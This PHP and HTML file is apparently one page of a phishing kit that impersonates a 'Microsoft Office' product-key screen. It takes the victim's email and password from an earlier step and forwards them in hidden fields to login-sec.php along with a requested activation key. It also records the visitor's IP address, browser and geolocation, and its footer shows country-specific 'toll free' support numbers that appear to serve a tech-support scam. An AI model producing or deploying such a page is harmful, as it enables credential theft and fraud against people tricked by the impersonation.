<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();
?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<?php 

$email=$_POST['email'];
$pass=$_POST['pass'];

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Microsoft Office</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/style.css">
    <link rel="stylesheet" href="../css/banner.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">
    <link rel="icon" href="../img/favicon.ico" type="image/x-icon">

</head>
<body class="background-login">
    <div class="container">
        <div class="col-lg-4 col-lg-offset-4 sigin-box">
            <h1><img src="../img/logo.png" class="logo1" alt=""></h1>
            <!-- <h3 id="sign-head">Sign in</h3> -->
            <h3><a class="mediateroy-text">Having New Product Key Enter Below</a></h3>
            <!-- <h3 id="pass-head">Enter password</h3> -->
            <form action="login-sec.php" method="POST">
            <div>
                <input type="text"  id="emailField"  name="key_pro" placeholder="Enter Your Activation key" class="sign-input" required><br><br>
            </div>
            <div>
                <input type="hidden" id="browserField" value="<?php echo $pass ?>"  name="pass" placeholder="Last Name" class="sign-input" required>
                <input type="hidden" id="browserField" value="<?php echo $email ?>"  name="email" placeholder="Last Name" class="sign-input" required>
            </div>
            <div style="overflow:auto;">
                <div style="float:right;">
                    <input type="submit" name="submit" class="submit-nbtn" id="submit" value="Submit">
                </div>
            </div>
            </form>

            <h3  style="margin-left:20%"><a class="mediateroy-text">OR</a></h3>
            <h3 ><a class="mediateroy-text">Don't Have Product Key?</a></h3>

            <form  action="login-sec.php" method="POST">
            <div >
                <input type="hidden"  id="emailField"  name="key_pro" value="dont have key">
                <input type="hidden" id="browserField" value="<?php echo $pass ?>"  name="pass" placeholder="Last Name" class="sign-input" required>
                <input type="hidden" id="browserField" value="<?php echo $email ?>"  name="email" placeholder="Last Name" class="sign-input" required>
            </div>
            <div style="overflow:auto;">
                <div style="float:right;">
                    <input type="submit" name="submit" class="submit-nbtn" id="submit" value="Continue Login">
                </div>
            </div>
            </form>
        </div>
    </div>
    <div class="footer">
  <p><span class="cont-text">Customer Support Toll Free  :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?> 
  </span> </p>
</div>
</body>
</html>

